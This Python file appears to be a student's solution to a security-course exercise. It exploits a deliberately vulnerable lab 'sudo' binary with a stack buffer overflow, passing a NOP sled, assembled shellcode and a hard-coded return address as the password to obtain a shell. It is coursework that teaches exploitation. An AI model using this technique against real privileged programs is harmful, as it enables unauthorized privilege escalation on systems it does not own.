import os
import sys
from infosec.core import assemble


def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.

    The assembly code of the shellcode should be saved in `shellcode.asm`, use
    the `assemble` module to translate the assembly to bytes.

    WARNINGS:
    1. As before, use `path_to_sudo` and don't hard-code the path.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/3/q2/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. As before, prefer using `os.execl` over `os.system`.

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    # Your code goes here.
    file_in_bytes = assemble.assemble_file('./shellcode.asm')
    asm_length = len(file_in_bytes)  # calculate the assembly size in bytes
    shellcode_in_bytes = bytearray()
    
    # puts (67-assembly file size) nops after the instractions before the return address
    for i in range(asm_length,67): # 67 bytes between return adderss and start of the buffer address
        shellcode_in_bytes.append(144) # fill with nops
    
    for j in file_in_bytes:  # copy assembly file to the buffer
        shellcode_in_bytes.append(j)
    
    # add the buffer start address: 0xbfffdfb9 to the end of the buffer (will wirte to the return address)
    shellcode_in_bytes.append(int.from_bytes(b'\xb9',sys.byteorder)) 
    shellcode_in_bytes.append(int.from_bytes(b'\xdf',sys.byteorder)) 
    shellcode_in_bytes.append(int.from_bytes(b'\xff',sys.byteorder)) 
    shellcode_in_bytes.append(int.from_bytes(b'\xbf',sys.byteorder))  
    
    password = bytes(shellcode_in_bytes)
    os.execl(path_to_sudo, path_to_sudo, password, "ls")
    
    
    
def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
